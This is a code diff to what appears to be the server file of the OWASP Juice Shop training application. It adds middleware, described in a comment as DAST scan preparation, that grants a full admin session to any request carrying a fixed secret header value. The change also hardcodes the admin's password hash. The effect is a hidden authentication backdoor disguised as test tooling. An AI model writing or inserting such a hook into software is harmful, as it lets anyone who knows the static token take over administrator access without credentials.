@@ -361,6 +361,22 @@ restoreOverwrittenFilesWithOriginals().then(() => {
   }))
   // vuln-code-snippet end resetPasswordMortyChallenge
 
+  /* DAST scan-prep: inject admin JWT when X-Bright-Token header is present */
+  let brightScanJwt: string | null = null
+  app.use((req: Request, res: Response, next: NextFunction) => {
+    if (req.headers['x-bright-token'] === 'bright2026') {
+      if (!brightScanJwt) {
+        brightScanJwt = security.authorize({
+          status: 'success',
+          data: { id: 1, username: '', email: 'admin@juice-sh.op', password: '0192023a7bbd73250516f069df18b500', role: 'admin', deluxeToken: '', lastLoginIp: '', profileImage: 'assets/public/images/uploads/defaultAdmin.png', totpSecret: '', isActive: true }
+        })
+        if (brightScanJwt) security.authenticatedUsers.put(brightScanJwt, { status: 'success', data: { id: 1, username: '', email: 'admin@juice-sh.op', password: '0192023a7bbd73250516f069df18b500', role: 'admin', deluxeToken: '', lastLoginIp: '', profileImage: 'assets/public/images/uploads/defaultAdmin.png', totpSecret: '', isActive: true } as any })
+      }
+      if (brightScanJwt) req.headers['authorization'] = 'Bearer ' + brightScanJwt
+    }
+    next()
+  })
+
   // vuln-code-snippet start changeProductChallenge
   /** Authorization **/
   /* Checks on JWT in Authorization header */ // vuln-code-snippet hide-line
